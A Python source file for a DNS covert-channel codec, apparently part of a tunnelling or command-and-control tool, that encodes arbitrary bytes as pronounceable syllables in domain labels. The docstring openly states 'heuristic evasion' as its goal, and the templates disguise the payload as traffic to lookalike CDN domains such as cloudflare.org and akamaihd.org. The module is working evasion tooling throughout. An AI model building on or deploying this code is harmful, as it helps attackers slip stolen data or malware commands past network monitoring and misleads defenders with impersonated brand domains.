"""CVC Codec v2.1 - Compact Heuristic Evasion
============================================
Features:
- CRC16 checksum for payload validation
- NO static delimiters
- 7 syllables per label (21 chars = CDN-hash look)
- Max 4-6 total labels per domain
- Realistic DNS template patterns (no junk)
"""
import random
import struct

# --- CVC Constants ---
C_START = ['b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'z']
VOWELS = ['a', 'e', 'i', 'o', 'u', 'y']
C_END = ['b', 'c', 'd', 'f', 'g', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'x', 'z']

# Syllables per DNS label (7 syllables = 21 chars, looks like CDN hash/token)
SYLLABLES_PER_LABEL = 7

# --- Realistic DNS Templates ---
# {P} = payload labels (2-3 labels of 21 chars each)
# Templates kept to 2-3 non-payload labels -> 4-6 total
TEMPLATES = [
    # CDN-style (payload + 2 suffix = 4-5 total)
    "{P}.cloudflare.org",
    "{P}.akamaihd.org",
    "{P}.cloudfront.org",
    "{P}.fastly.org",
    # Prefix + payload + suffix (1+payload+1 = 4-5 total)
    "static.{P}.org",
    "cdn.{P}.org",
    "dl.{P}.org",
    "img.{P}.org",
    "api.{P}.io",
    "data.{P}.io",
    "v1.{P}.io",
    "ns.{P}.io",
]

# Labels that are valid CVC but NOT payload (template parts / TLDs)
TLD_BLACKLIST = {'com', 'net', 'biz', 'gov', 'mil', 'pub', 'top', 'win', 'xyz',
                 'cdn', 'api', 'web', 'dev', 'app'}

def _crc16(data: bytes) -> int:
    """CRC-16/CCITT-FALSE - Used to validate decoded payloads"""
    crc = 0xFFFF
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return crc

def _value_to_syllable(value_10bit: int) -> str:
    """Convert 10-bit integer to CVC syllable"""
    idx_end = value_10bit % 15
    rem = value_10bit // 15
    idx_vow = rem % 6
    rem = rem // 6
    idx_start = rem % 19
    return f"{C_START[idx_start]}{VOWELS[idx_vow]}{C_END[idx_end]}"

def _syllable_to_value(syl: str) -> int:
    """Convert CVC syllable back to 10-bit integer"""
    idx_start = C_START.index(syl[0])
    idx_vow = VOWELS.index(syl[1])
    idx_end = C_END.index(syl[2])
    return (idx_start * 90) + (idx_vow * 15) + idx_end

def _is_valid_cvc(s: str) -> bool:
    """Check if a 3-char string is a valid CVC syllable"""
    if len(s) != 3:
        return False
    return s[0] in C_START and s[1] in VOWELS and s[2] in C_END

def _bytes_to_cvc_labels(data: bytes) -> list:
    """
    Convert raw bytes to CVC-encoded labels (list of domain parts)
    
    Format: [length (1 byte)] + [data]
    - length allows exact byte boundary recovery
    - Padding bits are always 0 (deterministic)
    """
    if not data:
        return []
    
    # Simple format: length byte + data
    if len(data) > 255:
        # For data > 255 bytes, use 2-byte length
        data_with_header = bytes([0xFF, (len(data) >> 8) & 0xFF, len(data) & 0xFF]) + data
    else:
        data_with_header = bytes([len(data)]) + data
    
    huge_int = int.from_bytes(data_with_header, 'big')
    total_bits = len(data_with_header) * 8
    
    # Pad to multiple of 10 bits (deterministic zeros)
    padding_bits = (10 - (total_bits % 10)) % 10
    if padding_bits > 0:
        huge_int = huge_int << padding_bits  # Pad with zeros
        total_bits += padding_bits
    
    num_chunks = total_bits // 10
    
    cvc_list = []
    for _ in range(num_chunks):
        chunk_val = huge_int & 0x3FF
        cvc_list.append(_value_to_syllable(chunk_val))
        huge_int >>= 10
    
    cvc_list.reverse()
    
    # Group into labels (7 syllables per label = 21 chars, CDN-hash look)
    labels = []
    current_group = ""
    for i, cvc in enumerate(cvc_list):
        current_group += cvc
        if (i + 1) % SYLLABLES_PER_LABEL == 0:
            labels.append(current_group)
            current_group = ""
    if current_group:
        labels.append(current_group)
    
    return labels

def _cvc_labels_to_bytes(labels: list, debug=False) -> bytes:
    """
    Convert CVC-encoded labels back to raw bytes.
    
    Format: [length (1 byte)] + [data]
    Or for data > 255: [0xFF, length_hi, length_lo] + [data]
    """
    syllables = []
    
    for part in labels:
        if len(part) == 0 or len(part) % 3 != 0:
            continue
        for i in range(0, len(part), 3):
            sub = part[i:i+3]
            if _is_valid_cvc(sub):
                syllables.append(sub)
    
    if not syllables:
        return b""
    
    # Reconstruct the big integer from syllables
    huge_int = 0
    for syl in syllables:
        try:
            val_10bit = _syllable_to_value(syl)
            huge_int = (huge_int << 10) | val_10bit
        except ValueError:
            continue
    
    if huge_int == 0:
        return b""
    
    # Calculate number of syllables and expected bits
    num_syllables = len(syllables)
    total_encoded_bits = num_syllables * 10
    
    # Try each possible padding amount (0-9)
    for padding_bits in range(10):
        test_int = huge_int >> padding_bits
        test_byte_len = (total_encoded_bits - padding_bits) // 8
        
        if test_byte_len < 1:
            continue
        
        try:
            test_bytes = test_int.to_bytes(test_byte_len, 'big')
        except OverflowError:
            continue
        
        if len(test_bytes) < 1:
            continue
        
        # Check if extended length format (first byte = 0xFF)
        if test_bytes[0] == 0xFF and len(test_bytes) >= 3:
            original_length = (test_bytes[1] << 8) | test_bytes[2]
            header_size = 3
        else:
            original_length = test_bytes[0]
            header_size = 1
        
        expected_total = header_size + original_length
        
        # Validate: expected_total should match test_byte_len
        if expected_total == test_byte_len and original_length > 0 and original_length <= 1000:
            # Verify padding calculation matches
            original_bits = expected_total * 8
            expected_padding = (10 - (original_bits % 10)) % 10
            if expected_padding == padding_bits:
                return test_bytes[header_size:header_size + original_length]
    
    # Fallback: try using bit_length for byte count
    byte_length = (huge_int.bit_length() + 7) // 8
    if byte_length < 1:
        return b""
    
    try:
        decoded = huge_int.to_bytes(byte_length, 'big')
    except OverflowError:
        return b""
    
    if len(decoded) >= 1:
        if decoded[0] == 0xFF and len(decoded) >= 3:
            original_length = (decoded[1] << 8) | decoded[2]
            if 3 + original_length <= len(decoded):
                return decoded[3:3 + original_length]
        else:
            original_length = decoded[0]
            if 1 + original_length <= len(decoded):
                return decoded[1:1 + original_length]
    
    return b""


def encode_bytes_to_domain(raw_data: bytes) -> str:
    """
    Encode bytes to a realistic-looking DNS domain name.
    
    Format: [CRC16 (2 bytes)] + [raw_data]
    The CRC allows the decoder to identify valid payload via trial-and-error.
    """
    if not raw_data:
        return ""
    
    # Prepend CRC16 checksum for payload validation
    crc = _crc16(raw_data)
    payload_with_crc = struct.pack('!H', crc) + raw_data  # 2 bytes CRC + data
    
    # Convert to CVC labels
    cvc_labels = _bytes_to_cvc_labels(payload_with_crc)
    
    if not cvc_labels:
        return ""
    
    # Join CVC labels with dots to form payload subdomain
    payload_str = ".".join(cvc_labels)
    
    # Pick random template and fill in payload
    template = random.choice(TEMPLATES)
    domain = template.replace("{P}", payload_str)
    
    return domain


# Alias for backwards compatibility
encode_packet_to_domain = encode_bytes_to_domain


def decode_domain_to_bytes(domain_string: str, debug=False) -> bytes:
    """
    Decode a DNS domain name back to raw bytes.
    
    Strategy:
    1. Split domain into labels
    2. Collect ALL labels that are pure CVC (no digits, all triplets valid)
    3. Decode and verify CRC16
    """
    parts = domain_string.lower().rstrip('.').split('.')
    
    if debug:
        print(f"[DECODE DEBUG] Domain parts: {parts}")
    
    # Collect all pure CVC labels (skip junk with digits, skip non-CVC)
    cvc_labels = []
    for label in parts:
        # Skip blacklisted TLDs
        if label in TLD_BLACKLIST:
            continue
        
        # Skip labels containing ANY digit (that's the junk label)
        if any(c.isdigit() for c in label):
            continue
        
        # Must be non-empty and length divisible by 3
        if len(label) == 0 or len(label) % 3 != 0:
            continue
        
        # ALL triplets must be valid CVC
        all_valid = True
        for i in range(0, len(label), 3):
            if not _is_valid_cvc(label[i:i+3]):
                all_valid = False
                break
        
        if all_valid:
            cvc_labels.append(label)
    
    if not cvc_labels:
        return b""
    
    # Decode CVC labels to bytes
    decoded = _cvc_labels_to_bytes(cvc_labels, debug=debug)
    
    if len(decoded) < 3:  # Minimum: 2 bytes CRC + 1 byte data
        return b""
    
    # Verify CRC16
    crc_received = struct.unpack('!H', decoded[:2])[0]
    data = decoded[2:]
    crc_calculated = _crc16(data)
    
    if crc_received == crc_calculated:
        return data
    
    return b""


def decode_domain_to_bytes_fast(domain_string: str, debug=False) -> bytes:
    """
    Alias for decode_domain_to_bytes for backwards compatibility.
    """
    return decode_domain_to_bytes(domain_string, debug=debug)